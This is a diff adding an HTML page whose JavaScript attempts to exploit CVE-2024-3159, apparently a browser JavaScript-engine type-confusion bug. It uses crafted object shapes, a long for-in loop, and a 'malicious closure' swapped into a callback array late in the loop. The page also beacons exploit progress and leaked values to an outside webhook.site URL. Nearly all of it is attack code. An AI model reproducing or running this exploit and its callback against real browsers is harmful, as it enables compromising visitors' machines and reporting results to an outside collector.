@@ -1,0 +1,57 @@
+<html><body><script>
+// CVE-2024-3159 natives-free attempt G: for-in inside OSR hot loop, dynamic megamorphic callback
+const SINK = 'https://webhook.site/a02901c5-1463-4d49-8c93-b651b9c35595/';
+function beacon(t, v){
+  try { fetch(SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,200)), {mode:'no-cors'}); } catch(e) {}
+}
+beacon('start', 'G-osr-inloop');
+var t0 = Date.now();
+
+const object1 = {};
+object1.a = 1;
+const object2 = {};
+object2.a = 1;
+object2.b = 1;
+const object3 = {};
+object3.a = 1;
+object3.b = 1;
+object3.c = 1;
+Object.defineProperty(object3, "d", {writable: false, enumerable: true, value: 1});
+const object4 = {};
+object4.a = 1;
+object4.b = 1;
+object4.c = 1;
+object4.d = 1;
+
+for (let key in object3) { }
+delete object3.d;
+
+var keysSeen = [];
+var escape;
+var fired = false;
+var mal = function () {
+  object4.c = 1.1;
+  for (let key in object1) { }
+};
+function cb0(){} function cb1(){} function cb2(){} function cb3(){}
+function cb4(){} function cb5(){} function cb6(){} function cb7(){}
+function cb8(){} function cb9(){} function cbA(){} function cbB(){}
+function cbC(){} function cbD(){} function cbE(){} function cbF(){}
+var cbs = [cb0,cb1,cb2,cb3,cb4,cb5,cb6,cb7,cb8,cb9,cbA,cbB,cbC,cbD,cbE,cbF];
+
+function trigger() {
+  for (var k = 0; k < 120000; k++) {
+    if (k === 119000) cbs[3] = mal;   // swap malicious closure in — generic call site, no deopt
+    for (let key in object2) {
+      if (k > 119000 && cbs[k & 15] === mal) fired = true;
+      (cbs[k & 15])();
+      escape = object2[key];
+      if (k > 119000) keysSeen.push(key + ':' + (typeof escape));
+    }
+  }
+}
+trigger();
+beacon('stage', 'done t=' + (Date.now() - t0) + ' fired=' + fired);
+beacon('keys', keysSeen.slice(0, 12).join('|'));
+beacon('escape', 'last=' + (typeof escape) + ':' + String(escape).slice(0,60));
+</script></body></html>
